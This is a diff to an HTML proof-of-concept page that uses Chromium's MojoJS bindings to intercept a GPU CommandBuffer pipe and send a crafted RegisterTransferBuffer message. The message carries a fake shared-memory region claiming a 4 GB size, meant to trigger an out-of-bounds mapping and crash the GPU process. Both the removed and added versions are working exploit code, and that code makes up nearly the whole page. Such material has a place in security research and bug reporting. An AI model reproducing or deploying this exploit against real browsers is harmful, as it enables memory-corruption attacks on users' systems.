@@ -4,87 +4,63 @@
 <body>
 <h1>Sending malicious RegisterTransferBuffer</h1>
 <script>
-// Helper: get a CommandBuffer remote by creating a WebGL context
-async function getCommandBufferRemote() {
-  // Use Mojo interface interceptor to capture the next gpu.mojom.CommandBuffer request
-  const interceptor = new MojoInterfaceInterceptor('gpu.mojom.CommandBuffer', 'process');
-  interceptor.oninterfacerequest = (e) => {
-    // e.handle is the Mojo handle that the browser will send requests to
-    // We'll bind it and return a remote
-    const remote = new gpu.mojom.CommandBufferPtr(e.handle);
-    interceptor.stop();
-    return remote;
-  };
-  interceptor.start();
-
-  // Create a WebGL context to trigger command buffer creation
-  const canvas = document.createElement('canvas');
-  const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-  if (!gl) throw 'WebGL not supported';
-
-  // The command buffer will be created asynchronously; we must wait a bit
-  return new Promise((resolve) => {
-    setTimeout(() => {
-      // The interceptor should have fired by now; retrieve the remote
-      // Unfortunately, the interceptor callback cannot return a value synchronously,
-      // so we need a different approach. Instead, we can access the Mojo handle directly
-      // through the WebGL context's internal Mojo pipe (not exposed publicly).
-      // A workaround: use the debug Mojo API to bind the interface that was just created.
-      // This is a bit hacky but works with MojoJSTest.
-      const remote = Mojo.getInterface('gpu.mojom.CommandBuffer');
-      resolve(remote);
-    }, 1000);
-  });
-}
-
-async function sendMaliciousRegisterTransferBuffer(remote) {
-  // Craft the raw message
-  const payload = new ArrayBuffer(256);
-  const view = new DataView(payload);
-
-  // --- Mojo message header (for associated interface, 16-byte header) ---
-  // [0x00] struct header for the RegisterTransferBuffer params
-  view.setUint32(0, 24, true);    // size
-  view.setUint32(4, 0, true);     // version
-  // [0x08] id (int32)
-  view.setInt32(8, 0x1234, true); // arbitrary id
-  // [0x0C] padding
-  view.setUint32(12, 0, true);
-  // [0x10] pointer to SharedMemoryRegion (relative offset)
-  // Let's make it point to offset 0x40 within the message
-  const regionOffset = 0x40 - 0x10; // relative from the pointer field
-  view.setBigInt64(16, BigInt(regionOffset), true);
-
-  // --- Fake SharedMemoryRegion at offset 0x40 ---
-  // Header: size=24? Actually the shared memory region struct might have its own header.
-  // We'll craft it manually: first 8 bytes: size(24) + version(0)
-  view.setUint32(0x40, 24, true);
-  view.setUint32(0x44, 0, true);
-  // Handle index: we need a valid shared buffer handle. Create one with Mojo.
-  const sharedBuffer = Mojo.createSharedBuffer(4096);
-  // The handle index will be placed in the message's handle table. We can get its index later.
-  // For now, set it to 0 (the first attached handle)
-  view.setUint32(0x48, 0, true); // handle index
-  view.setUint32(0x4C, 0, true); // padding
-  // Size: huge value to trigger OOB mapping
-  view.setBigUint64(0x50, BigInt(0x100000000), true); // 4GB
-
-  // Prepare handles array: our shared buffer handle
-  const handles = [sharedBuffer.handle];
-
-  // Send the raw message
-  const pipe = remote.ptr.getHandle();
-  Mojo.writeMessage(pipe, payload, handles);
-  console.log('Malicious message sent!');
-}
-
-(async () => {
+(async function() {
   try {
-    const remote = await getCommandBufferRemote();
-    await sendMaliciousRegisterTransferBuffer(remote);
-    document.body.innerHTML += '<p>Message sent. Check GPU process for crash.</p>';
-  } catch(e) {
-    document.body.innerHTML += `<p>Error: ${e}</p>`;
+    // 1. Intercept the gpu.mojom.CommandBuffer request that will be created
+    //    when we create a WebGL context.
+    const interceptor = new MojoInterfaceInterceptor('gpu.mojom.CommandBuffer', 'process');
+    interceptor.oninterfacerequest = (e) => {
+      interceptor.stop();   // only need one
+
+      // e.handle is the Mojo handle that the browser will use to send requests.
+      // We'll bind it and send our malicious message.
+      const remote = new gpu.mojom.CommandBufferPtr(e.handle);
+
+      // 2. Craft the raw message for ordinal 4 (RegisterTransferBuffer)
+      const payload = new ArrayBuffer(256);
+      const view = new DataView(payload);
+
+      // --- RegisterTransferBuffer_Params_Data (24 bytes) ---
+      view.setUint32(0, 24, true);         // header: size = 24
+      view.setUint32(4, 0, true);          // version = 0
+      view.setInt32(8, 0x1234, true);      // id (arbitrary non-zero)
+      view.setUint32(12, 0, true);         // padding
+      // pointer to SharedMemoryRegion (relative offset)
+      const regionOffset = 0x40 - 0x10;    // points to offset 0x40 in the buffer
+      view.setBigInt64(16, BigInt(regionOffset), true);
+
+      // --- Fake SharedMemoryRegion at offset 0x40 ---
+      // Header: size=24, version=0 (for a typical region struct)
+      view.setUint32(0x40, 24, true);
+      view.setUint32(0x44, 0, true);
+      // Handle index: we attach one shared buffer handle; its index will be 0
+      view.setUint32(0x48, 0, true);       // handle index
+      view.setUint32(0x4C, 0, true);       // padding
+      // Huge size -> out-of-bounds mapping
+      view.setBigUint64(0x50, BigInt(0x100000000), true); // 4 GB
+
+      // Create a small valid shared buffer to attach
+      const sharedBuffer = Mojo.createSharedBuffer(4096);
+      const handles = [sharedBuffer.handle];
+
+      // 3. Send the raw message directly to the GPU process
+      Mojo.writeMessage(remote.ptr.getHandle(), payload, handles);
+      document.body.innerHTML += '<p style="color:green">Malicious message sent!</p>';
+    };
+
+    interceptor.start();
+
+    // 4. Trigger command buffer creation by obtaining a WebGL context
+    const canvas = document.createElement('canvas');
+    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+    if (!gl) throw new Error('WebGL not available');
+
+    // The interceptor callback will fire asynchronously when the browser
+    // creates the command buffer. Give it a moment.
+    await new Promise(resolve => setTimeout(resolve, 1000));
+
+  } catch (err) {
+    document.body.innerHTML += `<p style="color:red">Error: ${err.message}</p>`;
   }
 })();
 </script>
